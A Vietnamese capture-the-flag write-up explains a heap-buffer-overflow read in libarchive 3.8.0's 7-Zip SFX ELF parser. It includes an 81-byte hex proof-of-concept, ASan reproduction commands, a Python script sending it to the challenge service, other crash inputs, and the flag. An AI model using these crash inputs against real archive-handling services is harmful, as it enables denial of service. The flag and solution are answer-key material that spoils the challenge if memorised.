---
title: "VULN#007"
category: "Vuln Research"
tags: ["libarchive", "7zip", "sfx", "elf", "heap-buffer-overflow", "crash-oracle"]
solve_date: "2026-11-03T19:05:00+07:00"
language: "vi"
points: 100
---

# VULN#007 — heap-buffer-overflow khi libarchive dò 7-Zip SFX

**Flag:** CTF{d1644621477661ffdb452d8b4c5394ba}  
**Service:** 169.58.126.107:7031  
**Định dạng flag:** CTF{...}

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| libarchive-src.tar.gz (libarchive 3.8.0 + harness) | 6,258,476 | 2c8d20174d60137084fd56e0c633c67f3e9afbb01a46df9e60190f6be0c05e70 |
| harness/harness.c | 2,062 | e0246535b05185aa67066fdb17a064ee2bc7b3abd952600b70140ef35f8cc621 |
| poc_issue2765.elf | 81 | 5ef83b82d1fa9e56e127db3d75dc936bd7412e3837d0648245145e1d02f72d1b |

## Đề bài

> VULN#007 — 100 điểm. Archive-inspection service liệt kê nội dung file archive gửi tới.

Handout là libarchive-src.tar.gz chứa checkout libarchive 3.8.0 chưa chỉnh sửa và harness/harness.c tối giản. Service remote nhận file có length-prefix, chạy harness và báo process có crash hay không. Crash khớp bug mục tiêu trả flag; crash khác được báo là “a crash happened, but not the target one”.

Đây là crash oracle, nên mục tiêu là tìm đúng memory-safety bug tác giả chọn, không phải tạo bất kỳ crash nào trong libarchive.

## Phân tích

### Handout

harness.c dùng đường đọc libarchive chuẩn mà bsdtar/bsdunzip sử dụng để liệt kê:

```c
struct archive *a = archive_read_new();
archive_read_support_filter_all(a);
archive_read_support_format_all(a);

int r = archive_read_open_memory(a, buf, (size_t)len);
if (r != ARCHIVE_OK) { /* "not valid" */ }

struct archive_entry *entry;
while ((r = archive_read_next_header(a, &entry)) == ARCHIVE_OK) {
    fprintf(stderr, "entry: %s\n", archive_entry_pathname(entry));
    if (++count > 1000) break;
}
```

Chỉ gọi archive_read_next_header(); không giải nén data. Source giống từng byte với upstream v3.8.0; chỉ thêm harness/ và một vài test fixture không có trong release tarball.

### Protocol service

Mỗi request là **length big-endian 4 byte** rồi đúng số raw byte đó. Status quan sát được:

| Status | Ý nghĩa |
|---|---|
| status: bad length | length khai báo bằng 0 hoặc vượt giới hạn service |
| status: not valid | input bị từ chối trước khi gọi libarchive harness |
| status: no crash | harness chạy xong bình thường |
| status: a crash happened, but not the target one | có crash nhưng signature không khớp |
| status: crash confirmed (<description>) + FLAG: ... | crash mục tiêu |
| status: harness timed out | vượt thời gian chạy harness |
| status: rate limited, try again later | quota theo IP; cần chờ rồi retry |

### ELF gate

Điều bất ngờ đầu tiên: archive thông thường đều bị từ chối:

```text
zip  -> status: not valid
tar  -> status: not valid
iso  -> status: not valid
7z   -> status: not valid
ELF  -> status: no crash
```

Service chỉ chạy harness nếu input là ELF executable hợp lệ. Đây là chủ ý: target là hỗ trợ self-extracting archive (SFX) của libarchive, nơi ELF (hoặc PE) stub đứng trước archive nhúng. 7-Zip bidder của libarchive nhận diện prefix \x7fELF, parse ELF section header rồi tìm signature 7z\xbc\xaf\x27\x1c sau .data section.

Có thể xác nhận gate bằng file lai: ISO thường bắt đầu bằng 32 KiB system area bị bỏ qua, nên thay 64 byte đầu bằng ELF header hợp lệ vẫn cho file qua gate và libarchive parse phần còn lại thành ISO9660. Joliet ISO có Rock Ridge CL/RE cycle sau đó làm harness crash, chứng minh harness chạy trên cùng buffer.

### Bug

Trong libarchive/archive_read_support_format_7zip.c, find_elf_data_sec() đọc ELF section table để tìm .shstrtab và .data. Với ELF 32-bit, phần liên quan:

```c
e_shoff     = dec32(h + 0x20);
e_shentsize = dec16(h + 0x2E);
e_shnum     = dec16(h + 0x30);
e_shstrndx  = dec16(h + 0x32);

if (e_shnum < e_shstrndx || e_shentsize < 0x18)
    break;

if (__archive_read_seek(a, e_shoff, SEEK_SET) < 0)
    break;
h = __archive_read_ahead(a, (size_t)e_shnum * (size_t)e_shentsize, NULL);
if (h == NULL)
    break;

strtab_offset = (*dec32)(h + e_shstrndx * e_shentsize + 0x10);
strtab_size   = (*dec32)(h + e_shstrndx * e_shentsize + 0x14);
```

Validation dùng e_shnum < e_shstrndx, nên cho phép **e_shstrndx == e_shnum**. Phần read-ahead section table chỉ chứa e_shnum * e_shentsize byte, nhưng code đọc tiếp field strtab_offset/strtab_size ở index e_shstrndx — vượt qua section table đúng một entry. Nếu table nằm cuối input buffer, lần đọc này vượt heap allocation.

Cùng pattern có ở ELF 64-bit (+0x18 / +0x20); find_elf_data_sec() còn thiếu bounds check cho e_shoff, strtab_offset và sh_offset của .data section.

### Fix

Upstream gia cố toàn bộ SFX parser trong PR #2985 (“7zip: Harden SFX parser”, merge 2026-06-23, phát hành trong 3.8.8). Patch:

- yêu cầu e_shnum * e_shentsize + 0x28 byte (64-bit) / + 0x18 byte (32-bit), để entry section bổ sung nằm trong read-ahead buffer;
- từ chối e_shoff / strtab_offset âm hoặc offset vượt SFX_MAX_SEEK (8 MiB);
- giới hạn strtab_size trong SFX_MAX_SEEK;
- thay cặp skip_sfx()/find_elf_data_sec() bằng get_data_offset()/get_elf_sfx_offset().

Regression test test_read_format_7zip_issue2765.c mới được thêm mong archive_read_open_filename() trả ARCHIVE_FATAL với sample từ **GitHub issue #2765**. Trên 3.8.0 cùng sample gây crash.

## PoC

Sample 81 byte từ issue #2765 là ELF32 SFX kích hoạt chính phép đọc đó:

```text
$ xxd poc_issue2765.elf
00000000: 7f45 4c46 0101 0100 6000 0008 4000 0000  .ELF....`...@...
00000010: 0000 0000 3200 0000 3400 2000 0100 0000  ....2...4. .....
00000020: 0000 0000 0000 0000 0000 0000 0047 4900  .............GI.
00000030: 0100 0100 0000 504b 0070 ff7f 0000 0000  ......PK.p......
00000040: 0000 0000 0800 0000 b801 0000 00cd 8000  ................
00000050: 00                                       .
```

| Field | Giá trị | Hệ quả |
|---|---|---|
| e_shoff | 0 | section table bắt đầu ở offset 0 |
| e_shentsize | 0x49 (73) | một entry dài 73 byte |
| e_shnum | 1 | read-ahead có 73 byte |
| e_shstrndx | 1 | bằng e_shnum nên bounds check qua |

strtab_size được đọc tại h + 1*0x49 + 0x14 = h + 93 trong khi file (và harness malloc) chỉ dài 81 byte; phép đọc nằm 12 byte sau allocation.

### Xác minh local

Build 3.8.0 với ASan rồi chạy harness:

```bash
cmake -S libarchive-src/src -B build \
  -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
  -DENABLE_TEST=OFF
cmake --build build -j"$(nproc)" --target archive_static
gcc -fsanitize=address -g -O1 -Ilibarchive-src/src/libarchive \
  -o harness libarchive-src/src/harness/harness.c \
  build/libarchive/libarchive.a -lz -lbz2 -llzma -llz4 -lcrypto -lpthread
./harness poc_issue2765.elf
```
```text
==124619==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7bd9311e007c
READ of size 1 at 0x7bd9311e007c thread T0
    #0 archive_le32dec           archive_endian.h:119
    #1 find_elf_data_sec         archive_read_support_format_7zip.c:809
    #2 archive_read_format_7zip_bid  archive_read_support_format_7zip.c:557
    #3 choose_format             archive_read.c:703
    #4 archive_read_open1        archive_read.c:516
    #5 archive_read_open_memory2 archive_read_open_memory.c:86
    #6 archive_read_open_memory  archive_read_open_memory.c:58
    #7 main                      harness.c:47
```

Crash xảy ra trong giai đoạn **bidding**, trước khi parse 7-Zip header, nên ngoài ELF stub không cần cấu trúc 7z hợp lệ nào.

### Remote

```python
import socket, struct

data = open("poc_issue2765.elf", "rb").read()
s = socket.create_connection(("169.58.126.107", 7031), timeout=5)
s.sendall(struct.pack(">I", len(data)) + data)
print(s.recv(4096).decode())
```
```text
status: crash confirmed (heap-buffer-overflow in 7zip SFX detection)
FLAG: CTF{d1644621477661ffdb452d8b4c5394ba}
```

## Ngõ cụt và crash oracle

Service phân biệt crash mục tiêu với mọi crash khác, nên đây là bài tìm signature chứ không chỉ “làm nó crash”. Các crash bị từ chối với a crash happened, but not the target one:

| Input | Crash |
|---|---|
| Joliet ISO có Rock Ridge CL/RE cycle | stack overflow trong build_pathname_utf16be (sửa ở 3.8.11, PR #3736) |
| Joliet ISO có UTF-16BE name quá dài | heap-buffer-overflow trong build_pathname_utf16be (sửa ở 3.8.8) |
| ELF64 tự dựng có e_shnum == e_shstrndx | heap-buffer-overflow trong find_elf_data_sec ở line 804 (strtab_offset) |
| test_read_format_7zip_malformed3.7z | SEGV trong check_7zip_header_in_sfx (sửa bởi PR #2864) |
| Tar có pax header SCHILY.acl.ace | SEGV trong archive_acl_from_text_nl; remote trả harness timed out |

Target cụ thể là **phép đọc strtab_size của ELF 32-bit** ở line 809 trong find_elf_data_sec() — crash từ issue #2765 và regression test của PR #2985. Crash line 804 trước đó cùng loại bug nhưng là read site khác nên oracle từ chối.

Service cũng rate-limit mạnh: sau burst probe sẽ trả status: rate limited, try again later trong vài phút. Gửi từng request, chờ rồi thử lại là đủ.

## Flag

```text
CTF{d1644621477661ffdb452d8b4c5394ba}
```

## Tham khảo

- libarchive issue #2765 — https://github.com/libarchive/libarchive/issues/2765
- libarchive PR #2985 “7zip: Harden SFX parser” — https://github.com/libarchive/libarchive/pull/2985
- Upstream commit 740be68fc03640c7c0c2b5a191eb1337c265e0af
- libarchive 3.8.8 release — https://github.com/libarchive/libarchive/releases/tag/v3.8.8
